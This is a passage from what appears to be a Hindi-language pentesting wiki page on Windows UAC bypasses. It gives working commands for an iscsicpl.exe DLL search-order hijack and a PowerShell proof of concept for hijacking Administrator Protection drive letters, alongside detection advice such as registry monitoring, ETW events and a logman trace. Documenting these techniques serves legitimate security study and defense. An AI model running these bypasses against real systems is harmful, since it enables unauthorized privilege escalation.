- यह primitive **auto-elevation** और **DLL search-order hijacking** का संयोजन है, इसलिए DLL load की कमी को validate करने के लिए अन्य UAC bypass में इस्तेमाल होने वाला ProcMon workflow यहाँ भी उपयोगी है।

न्यूनतम flow:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

डिटेक्शन के सुझाव:
- `reg add` / registry writes को `HKCU\Environment\Path` में दर्ज करें, खासकर जब इनके तुरंत बाद `C:\Windows\SysWOW64\iscsicpl.exe` execute हो।
- `%TEMP%` या `%LOCALAPPDATA%\Microsoft\WindowsApps` जैसी **user-controlled** locations में `iscsiexe.dll` खोजें।
- `iscsicpl.exe` के launches को असामान्य child processes या सामान्य Windows directories के बाहर से होने वाले DLL loads से correlate करें।

### नए शोध, जिन्हें अलग से देखना चाहिए

2024 के बाद की कुछ chains अब क्लासिक `HKCU\Software\Classes` registry hijacks जैसी नहीं दिखतीं। उदाहरण के लिए, activation-context cache poisoning में **drive remap** और **DLL redirection** को chain करके trusted UI / auto-elevated binaries जैसे `ctfmon.exe` और बाद के targets जैसे `fodhelper.exe` के ज़रिए medium से high integrity तक पहुँचा जा सकता है। यहाँ बड़ा PoC दोहराने के बजाय, इन compact payload examples को देखें:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### प्रति-logon-session DOS device map के ज़रिए Administrator Protection (preview) drive-letter hijack

> [!NOTE]
> अगस्त 2026 तक, Microsoft अभी भी Administrator Protection को **Insider preview** के रूप में दस्तावेज़ित करता है: अक्टूबर 2025 का rollout वापस ले लिया गया था और इसे बाद की तारीख़ में जारी करने की योजना है। इन chains को test करने से पहले पुष्टि करें कि **Admin Approval Mode with Administrator protection** वास्तव में enabled है और device reboot किया जा चुका है; केवल stock 25H2 version string से यह साबित नहीं होता कि feature सक्रिय है।<sup>[[10]](#references)</sup>

Windows 11 25H2 preview builds पर `RAiLaunchAdminProcess` / UIAccess attack surface की पूरी जानकारी के लिए, यह dedicated page देखें:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 का “Administrator Protection” प्रति-session `\Sessions\0\DosDevices/<LUID>` maps वाले shadow-admin tokens इस्तेमाल करता है। `SeGetTokenDeviceMap` द्वारा पहली `\??` resolution पर यह directory lazily बनाई जाती है। अगर attacker shadow-admin token को केवल **SecurityIdentification** पर impersonate करता है, तो directory attacker को **owner** बनाकर बनाई जाती है (`CREATOR OWNER` inherit होता है), जिससे ऐसे drive-letter links बनाए जा सकते हैं जिन्हें `\GLOBAL??` पर प्राथमिकता मिलती है।<sup>[[7]](#references)</sup>

**चरण:**

1. Low-privileged session से, बिना prompt वाला shadow-admin `runonce.exe` spawn करने के लिए `RAiProcessRunOnce` call करें।
2. उसके primary token को **identification** token में duplicate करें और `\??` खोलते समय उसे impersonate करें, ताकि attacker के ownership में `\Sessions\0\DosDevices/<LUID>` बनाया जा सके।
3. वहाँ एक `C:` symlink बनाएँ, जो attacker-controlled storage की ओर इंगित करे; इसके बाद उस session में filesystem accesses `C:` को attacker path पर resolve करेंगे, जिससे बिना prompt के DLL/file hijack संभव होगा।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Preview hosts पर Administrator Protection, `Microsoft-Windows-LUA` provider के तहत approvals और failures को ETW events **15031** और **15032** के रूप में रिकॉर्ड करता है। इन events में requester SID, application path, outcome, managed administrator account और authentication method शामिल होते हैं, इसलिए बार-बार किए गए exploit attempts या UI driving की विफल कोशिशें telemetry-free नहीं होतीं।<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control कैसे काम करता है](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass तकनीकों का संग्रह](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner और launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI ने PowerShell backdoors बनाने के लिए AI अपनाया](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: दक्षिण-पूर्व एशियाई सरकारों को निशाना बनाकर 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection को bypass करना](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task का उपयोग करके UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip और Narrator के Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET से Local Windows RPC Servers को कॉल करना](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte ने Signed Windows Kernel Rootkit के साथ CoolClient को बेहतर बनाया](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: जासूसी, चोरी और आतंक फैलाने के लिए बना पूरी तरह से undetectable Windows Trojan](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
